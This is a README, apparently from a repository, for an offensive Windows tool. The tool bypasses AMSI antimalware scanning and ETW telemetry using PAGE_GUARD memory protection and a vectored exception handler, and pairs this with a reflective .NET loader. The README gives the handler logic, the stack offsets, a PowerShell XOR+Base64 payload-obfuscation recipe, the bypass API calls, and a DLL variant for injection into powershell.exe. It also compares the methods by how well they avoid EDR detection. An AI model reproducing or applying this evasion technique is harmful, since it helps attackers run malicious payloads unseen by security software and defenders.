# AMSI + ETW PAGE_GUARD VEH Bypass + .NET Reflective Loader

Patchless AMSI and ETW bypass via `PAGE_GUARD` memory protection combined with a Vectored Exception Handler (VEH). Includes a reflective .NET assembly loader with XOR+Base64 payload decoding and full argument passthrough.

No byte patching, no shellcode — pure exception-driven early return.

## How It Works

### Core Idea

Instead of overwriting function bytes (classic `mov eax, 0x80070057 / ret` patch), we mark the target function's memory page as `PAGE_EXECUTE_READ | PAGE_GUARD`. When the CPU tries to execute from a guarded page, Windows raises `STATUS_GUARD_PAGE_VIOLATION` before a single instruction of the target function runs. Our VEH intercepts this exception, spoofs the return value, and exits the function cleanly.

```
AmsiScanBuffer() called
         │
         ▼
  PAGE_GUARD violation  ◄── STATUS_GUARD_PAGE_VIOLATION
         │
         ▼
     VehHandler()
    ┌────────────────────────────────────────┐
    │  *pResult = AMSI_RESULT_CLEAN (0)      │  ← write clean result to arg6
    │  RIP      = stack[0]  (return addr)    │  ← jump back to caller
    │  RSP     += 8         (pop ret addr)   │
    │  RAX      = S_OK                       │  ← HRESULT success
    │  EFlags  |= TF        (Trap Flag)      │  ← arm re-protect
    └────────────────────────────────────────┘
         │
         ▼
  execution resumes at caller
         │
         ▼
  STATUS_SINGLE_STEP  ◄── TF fires after one instruction
         │
         ▼
     VehHandler()
    ┌──────────────────────┐
    │  VirtualProtect()    │  ← re-apply PAGE_GUARD
    └──────────────────────┘
```

### Execution Phases

CLR internally uses ETW during initialization, so bypasses must be installed in the correct order:

```
Phase 1: Decode payload (Base64 → XOR with key 'K')
         │
Phase 2: Initialize CLR (no bypass active)
         │  ← CLR Start() uses ETW internally — must be clean
         │
Phase 3: Install AMSI PAGE_GUARD → Assembly.Load
         │  ← CLR calls AmsiScanBuffer during Load — intercepted
         │
Phase 4: Reinstall bypass (AMSI + ETW) → Invoke entry point
         │  ← both AMSI and ETW suppressed during execution
         │
Phase 5: Cleanup
```

> **Why phased?** `ICorRuntimeHost::Start()` triggers internal ETW calls. If ETW's page is guarded during `Start()`, non-target ntdll functions on the same page cause thousands of guard violations that destabilize CLR init. Splitting phases avoids this entirely.

### Why PAGE_GUARD vs Hardware Breakpoints

| | PAGE_GUARD (this) | Hardware Breakpoints (DR0-DR7) |
|---|---|---|
| Registers modified | None | DR0-DR7 in thread context |
| Survives thread creation | Yes — VEH is process-wide | No — must set BP on every new thread |
| EDR detection surface | Lower | Some EDR monitor debug registers |
| Re-arm mechanism | TF + SINGLE_STEP | Permanent until removed |

### Why PAGE_GUARD vs Byte Patching

- **No disk writes or memory writes to .text** — the function bytes are never modified
- **Survives integrity checks** — hash of function bytes stays valid
- **No RWX pages** — only `PAGE_GUARD` flag toggled, no `PAGE_EXECUTE_READWRITE`
- **Works with signed / read-only pages** — we change *protection*, not *content*

---

## Targets

### AMSI — `AmsiScanBuffer` (amsi.dll)

```
HRESULT AmsiScanBuffer(
    HAMSICONTEXT amsiContext,   // RCX  — arg1
    PVOID        buffer,        // RDX  — arg2
    ULONG        length,        // R8   — arg3
    LPCWSTR      contentName,   // R9   — arg4
    HAMSISESSION amsiSession,   // [RSP+0x28] — arg5
    AMSI_RESULT *result         // [RSP+0x30] — arg6  ← we write 0 here
);
```

On violation: `*result = 0` (AMSI_RESULT_CLEAN), `RAX = S_OK`.

> **Note:** `AMSI_RESULT` is `ULONG` (4 bytes). The handler writes exactly 4 bytes via `outArgSize = 4` to avoid corrupting the caller's stack.

### ETW — `EtwEventWrite` (ntdll.dll)

```
ULONG EtwEventWrite(
    REGHANDLE           RegHandle,       // RCX
    PCEVENT_DESCRIPTOR  EventDescriptor, // RDX
    ULONG               UserDataCount,   // R8
    PEVENT_DATA_DESCRIPTOR UserData      // R9
);
```

On violation: no output params, `RAX = ERROR_SUCCESS (0)`. Telemetry call is silently dropped.

---

## Usage

### Standalone EXE — reflective .NET loader

```powershell
# Prepare payload (one-time)
$key = [byte][char]'K'
[byte[]]$data = Get-Content ./target.exe -Encoding Byte
$xored = $data | ForEach-Object { $_ -bxor $key }
[Convert]::ToBase64String($xored) | Set-Content "data.txt"

# Run — all arguments after exe name are forwarded to the .NET assembly
.\amsi_bypass_test.exe --flag1 value1 --flag2 value2
```

The loader:
1. Reads `data.txt` (Base64), decodes, XOR-decrypts with key `0x4B` (`'K'`)
2. Validates PE header (`MZ`)
3. Initializes CLR via `ICorRuntimeHost` (COM)
4. Installs AMSI bypass → `Assembly.Load` (CLR's AMSI scan is intercepted)
5. Adds ETW bypass → `Invoke` entry point with forwarded arguments
6. `argv[0]` (loader exe name) is stripped — the .NET assembly receives only `argv[1..]`

### Bypass engine API

```cpp
#include "bypass.hpp"

// AMSI: outArgIdx=6, outArgSize=4 (DWORD)
AddBypassTarget((PVOID)fnAmsiScanBuffer, S_OK, 6, 0, 4);

// ETW: no output param
AddBypassTarget((PVOID)fnEtwEventWrite, ERROR_SUCCESS);

InstallBypass();
// ... protected operations ...
UninstallBypass();
```

### As a DLL (inject into target process)

```cpp
// dllmain.cpp — DLL_PROCESS_ATTACH → InstallBypass()
// inject into powershell.exe / any CLR host
```

### Stack layout reference (x64 at function entry)

```
RSP+0x00  return address      ← stack[0]
RSP+0x08  shadow (arg1/RCX)   ← stack[1]
RSP+0x10  shadow (arg2/RDX)   ← stack[2]
RSP+0x18  shadow (arg3/R8)    ← stack[3]
RSP+0x20  shadow (arg4/R9)    ← stack[4]
RSP+0x28  arg5                ← stack[5]
RSP+0x30  arg6                ← stack[6]  ← AMSI_RESULT*
```

---

## Build

Requires Visual Studio with C++ workload (x64).

```bat
# From any PowerShell / cmd — build.bat auto-detects VS via vswhere
.\build.bat
```

Output:
- `amsi_bypass_test.exe` — standalone .NET reflective loader
- `amsi_bypass.dll` — injectable DLL (AMSI + ETW bypass only)

---

## File Structure

```
bypass.hpp          — generic PAGE_GUARD VEH engine (targets, install, uninstall)
main.cpp            — standalone EXE: CLR hosting, payload decode, reflective load
dllmain.cpp         — DLL wrapper (DLL_PROCESS_ATTACH → InstallBypass)
build.bat           — auto-detects MSVC via vswhere, builds EXE + DLL
data.txt            — XOR+Base64 encoded .NET payload (not in repo)
```

---

## Limitations

| Limitation | Notes |
|---|---|
| Per-process | VEH and PAGE_GUARD live in the injected process only |
| Environment.Exit | If the .NET assembly calls `Environment.Exit()`, the host process terminates before cleanup |
| Additional AMSI providers | Some EDR register extra providers beyond `AmsiScanBuffer` |
| Kernel-level hooks | If EDR hooks at ring-0, usermode PAGE_GUARD has no effect |
| ETW kernel channel | `EtwEventWrite` covers usermode ETW; kernel ETW is separate |
| Page sharing | Non-target functions on the same page as a target trigger guard violations — handled transparently but adds overhead |

---

## References

- [Patchless AMSI Bypass via Page Guard Exceptions — shigshag.com](https://shigshag.com/blog/amsi_page_guard)
- [vxCrypt0r/AMSI_VEH — Hardware Breakpoint variant](https://github.com/vxCrypt0r/AMSI_VEH)
- [Microsoft Docs — Vectored Exception Handling](https://learn.microsoft.com/en-us/windows/win32/debug/vectored-exception-handling)
- [Microsoft Docs — Memory Protection Constants](https://learn.microsoft.com/en-us/windows/win32/memory/memory-protection-constants)
